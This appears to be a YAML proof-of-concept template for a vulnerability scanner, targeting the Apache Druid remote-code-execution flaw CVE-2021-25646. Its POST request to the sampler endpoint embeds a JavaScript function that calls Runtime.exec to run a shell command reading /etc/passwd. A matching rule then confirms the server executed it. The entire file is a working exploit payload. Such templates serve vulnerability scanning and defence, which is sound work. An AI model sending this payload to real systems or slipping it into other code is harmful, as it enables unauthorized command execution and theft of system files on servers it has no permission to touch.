name: poc-yaml-apache-druid-cve-2021-25646-rce
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /druid/indexer/v1/sampler
            headers:
                Content-Type: application/json
            body: '{"type":"index","spec":{"ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"/etc","filter":"passwd"}},"dataSchema":{"dataSource":"odgjxrrrePz","parser":{"parseSpec":{"format":"javascript","timestampSpec":{},"dimensionsSpec":{},"function":"function(){var hTVCCerYZ = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"/bin/sh`@~-c`@~cat /etc/passwd\".split(\"`@~\")).getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:\"4137368\",OQtGXcxBVQVL: hTVCCerYZ}}","":{"enabled":"true"}}}}},"samplerConfig":{"numRows":10}}'
            follow_redirects: false
        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body) && response.body.bcontains(b"numRowsRead")
expression: r0()
detail:
    author: For3stCo1d (https://github.com/For3stCo1d)
    links:
        - https://www.secpulse.com/archives/154565.html
